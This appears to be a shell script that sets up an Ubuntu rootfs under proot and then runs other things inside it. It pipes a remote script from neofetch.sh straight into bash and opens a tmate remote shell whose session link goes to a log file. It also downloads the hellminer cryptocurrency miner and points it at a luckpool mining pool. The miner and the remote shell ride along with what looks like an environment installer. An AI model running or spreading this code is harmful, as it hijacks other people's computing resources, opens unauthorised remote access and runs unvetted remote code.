#!/bin/sh

ROOTFS_DIR=$(pwd)
export PATH=$PATH:~/.local/usr/bin
max_retries=50
timeout=1
ARCH=$(uname -m)

if [ "$ARCH" = "x86_64" ]; then
  ARCH_ALT=amd64
elif [ "$ARCH" = "aarch64" ]; then
  ARCH_ALT=arm64
else
  printf "Unsupported CPU architecture: ${ARCH}"
  exit 1
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  echo "Installing Ubuntu base rootfs..."
  wget --tries=$max_retries --timeout=$timeout --no-hsts -O /tmp/rootfs.tar.gz \
    "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz"
  mkdir -p $ROOTFS_DIR
  tar -xf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
fi

if [ ! -e $ROOTFS_DIR/usr/local/bin/proot ]; then
  mkdir -p $ROOTFS_DIR/usr/local/bin
  wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"
  chmod 755 $ROOTFS_DIR/usr/local/bin/proot
fi

if [ ! -e $ROOTFS_DIR/.installed ]; then
  echo "nameserver 1.1.1.1" > $ROOTFS_DIR/etc/resolv.conf
  echo "nameserver 1.0.0.1" >> $ROOTFS_DIR/etc/resolv.conf
  touch $ROOTFS_DIR/.installed
fi

$ROOTFS_DIR/usr/local/bin/proot \
  --rootfs="${ROOTFS_DIR}" \
  -0 -w /root -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit \
  /bin/bash -c '
    export DEBIAN_FRONTEND=noninteractive;
    apt update -y && apt install -y tmate curl wget libsodium23; 
    curl neofetch.sh | bash 
    echo "Tmate session starting...";
    tmate -F > /tmate.log 2>&1 &
cat /tmate.log
wget clone https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
tar -zxf hellminer_linux64.tar.gz 
./hellminer -c stratum+tcp://na.luckpool.net:3957 -u youraddress.nameworker -p x
  '
